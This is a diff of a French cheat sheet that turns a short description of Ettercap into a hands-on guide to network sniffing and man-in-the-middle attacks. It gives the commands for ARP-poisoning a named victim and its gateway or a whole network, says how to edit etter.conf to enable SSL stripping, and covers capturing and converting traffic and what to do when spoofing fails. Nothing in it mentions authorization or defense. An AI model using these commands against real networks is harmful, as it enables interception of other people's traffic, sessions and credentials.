@@ -1,15 +1,104 @@
-ces quoi Ettercap ?  
-Ettercap est un outil puissant pour le sniffing (écoute) de réseau et les attaques de l’homme du milieu. Il est utilisé pour l’évaluation de la sécurité réseau et les tests de pénétration. 
+🕵️‍♂️ Fiche Ettercap – Sniffing & MITM
+✅ 1. Lancer Ettercap
+Interface graphique (recommandée au début) :
+bash
+Copier
+Modifier
+sudo ettercap -G
+En mode texte (console uniquement) :
+bash
+Copier
+Modifier
+sudo ettercap -T -i wlan0
+📡 2. Choisir une interface réseau
+eth0 → câble Ethernet
 
-Voici quelques-unes de ses fonctionnalités :
-Sniffing : Ettercap peut capturer et analyser les connexions en direct.
-Attaques de l’homme du milieu : Il permet de manipuler les communications entre les hôtes.
-ARP Spoofing : Ettercap peut tromper les hôtes en falsifiant les tables ARP.
-Session Hijacking : Il peut intercepter et contrôler les sessions.
-Analyse des protocoles : Ettercap prend en charge la dissection active et passive de nombreux protocoles.
-Génération de rapports : Il peut générer des rapports d’analyse réseau.
+wlan0 → Wi-Fi
 
+wlan1 → Antenne Wi-Fi USB
+
+lo → loopback (interne)
+
+Exemple pour interface Wi-Fi :
+
+bash
+Copier
+Modifier
+sudo ettercap -T -i wlan0
+💡 Si Ettercap ne voit pas ta carte Wi-Fi, c’est peut-être parce qu’elle est en monitor mode. Pour Ettercap, il faut qu’elle soit en managed mode (connexion au réseau).
+
+🛠️ 3. Fonctions principales dans Ettercap GUI
+Menu	Fonction
+Sniff → Unified Sniffing	Démarrer la capture
+Hosts → Scan for Hosts	Scanner les IPs du réseau local
+Hosts → Hosts List	Afficher les machines trouvées (clic droit pour sélectionner)
+MITM → ARP Poisoning	Lancer une attaque ARP
+Start → Start Sniffing	Démarrer la capture
+
+🧪 4. Exemples de scénarios MITM (console)
+ARP Spoofing entre 2 machines :
+bash
+Copier
+Modifier
+sudo ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.25/
+-T → mode texte
+
+-M arp:remote → attaque MITM ARP sur réseau distant
+
+/IProuteur/ /IPvictime/ → cible la victime et la passerelle
+
+💡 Pour tout le réseau :
+
+bash
+Copier
+Modifier
+sudo ettercap -T -M arp:remote // //
+🧰 5. Config utile (fichiers)
+Modifier le fichier de conf pour débloquer SSL stripping :
+bash
+Copier
+Modifier
+sudo nano /etc/ettercap/etter.conf
+Dans la section privs, décommente :
+
+ini
+Copier
+Modifier
+ec_uid = 0
+ec_gid = 0
+Voir les scripts/plugins :
+bash
+Copier
+Modifier
+ls /usr/share/ettercap/plugins/
+Tu peux les lancer via :
+
+bash
+Copier
+Modifier
+Plugins → Manage Plugins
+📄 6. Logs & captures
+Fichier de capture :
+
+bash
+Copier
+Modifier
+sudo ettercap -T -w capture.eci
+Convertir en .pcap pour Wireshark :
+
+bash
+Copier
+Modifier
+sudo etterlog -p capture.eci
+⚠️ 7. Conseils & erreurs courantes
+Ettercap ne fonctionne pas si la carte est en monitor mode → repasse en mode managed :
+
+bash
+Copier
+Modifier
 sudo ip link set wlan0 down
-sudo iwconfig wlan0 mode monitor
+sudo iw dev wlan0 set type managed
 sudo ip link set wlan0 up
-
+Si tu n’as pas de trafic visible :
+→ Vérifie que tu es connecté au même réseau que ta cible
+→ L’ARP spoofing n’a pas forcément réussi
